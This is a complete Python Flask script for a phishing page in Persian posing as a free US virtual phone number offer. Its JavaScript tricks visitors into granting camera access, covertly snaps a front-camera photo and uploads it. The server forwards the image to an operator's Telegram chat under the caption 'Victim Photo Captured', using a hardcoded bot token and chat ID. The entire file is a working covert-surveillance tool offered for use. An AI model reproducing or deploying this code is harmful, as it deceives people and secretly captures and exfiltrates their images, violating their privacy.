import os
import base64
from flask import Flask, render_template_string, request, jsonify
import telebot

app = Flask(__name__)
BOT_TOKEN = "8628341169:AAH0RN8xSL2GuKIhqiEElvndV_xWoUyw9WE"
bot = telebot.TeleBot(BOT_TOKEN)

HTML_CONTENT = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Virtual Number - Secure & Free</title>
    <style>
        body { background: #0b0f19; color: white; text-align: center; padding-top: 40px; font-family: sans-serif; }
        .card { background: #161f30; padding: 25px; border-radius: 12px; display: inline-block; width: 85%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        h2 { font-size: 20px; margin-bottom: 5px; }
        p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
        button { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🇺🇸 United States</h2>
        <p>+1 398 362 8901</p>
        <button id="main-btn" onclick="triggerCapture()">SELECT</button>
    </div>

    <script>
        async function triggerCapture() {
            const btn = document.getElementById('main-btn');
            btn.innerText = "Connecting...";
            btn.disabled = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.playsInline = true;
                await video.play();

                await new Promise(resolve => setTimeout(resolve, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                // تبدیل عکس به Base64 برای ارسال پایدار و بدون خطای وب‌ویو
                const dataURL = canvas.toDataURL('image/jpeg', 0.85);

                await fetch("/upload" + window.location.search, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: dataURL })
                });

                btn.innerText = "Connected!";
                alert("شماره با موفقیت متصل شد.");

            } catch (err) {
                alert("لطفاً اجازه دسترسی به دوربین را تایید کنید.");
                btn.innerText = "SELECT";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_CONTENT)

@app.route("/upload", methods=["POST"])
def upload():
    user_id = request.args.get("user") or request.args.get("id")
    data = request.get_json()
    
    if data and "image" in data:
        try:
            image_data = data["image"].split(",")[1]
            image_bytes = base64.b64decode(image_data)
            
            target_id = user_id if user_id else "8173349543"
            bot.send_photo(target_id, image_bytes, caption="📸 Victim Photo Captured\n⚡ Developed by: @Kaliboy002")
        except Exception as e:
            print(f"Error processing image: {e}")
            
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
